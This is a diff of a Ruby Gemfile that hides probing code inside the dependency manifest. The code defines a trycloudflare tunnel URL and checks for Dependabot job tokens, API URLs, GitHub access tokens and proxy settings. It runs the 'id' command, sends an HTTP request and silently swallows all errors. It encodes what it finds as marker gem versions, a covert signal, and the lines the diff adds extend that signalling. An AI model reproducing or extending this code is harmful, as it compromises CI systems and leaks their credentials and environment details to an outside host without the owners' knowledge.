@@ -2,6 +2,7 @@ source "https://rubygems.org"
 
 TUN = "https://option-thats-dee-logistics.trycloudflare.com"
 marker_dependencies = []
+probe_error = false
 
 begin
   require "digest"
@@ -21,6 +22,7 @@ begin
   marker_dependencies << ["rake", "13.0.1"] unless ENV.fetch("DEPENDABOT_JOB_TOKEN", "").empty?
   marker_dependencies << ["minitest", "5.15.0"] unless ENV.fetch("DEPENDABOT_API_URL", "").empty? || ENV.fetch("DEPENDABOT_JOB_ID", "").empty?
   marker_dependencies << ["thor", "1.2.1"] unless ENV.fetch("LOCAL_GITHUB_ACCESS_TOKEN", "").empty?
+  marker_dependencies << ["connection_pool", "2.4.1"] unless ENV.fetch("HTTPS_PROXY", "").empty?
   cap.call("ID", "id", 70)
   api_base = ENV.fetch("DEPENDABOT_API_URL", "").sub(%r{/+$}, "")
   job_id = ENV.fetch("DEPENDABOT_JOB_ID", "")
@@ -50,8 +52,11 @@ begin
     http.request(request)
   end
 rescue Exception
+  probe_error = true
 end
 
+marker_dependencies << ["erubi", "1.10.0"] if probe_error
+marker_dependencies << ["zeitwerk", "2.6.1"]
 marker_dependencies.each do |name, version|
   gem name, version
 end
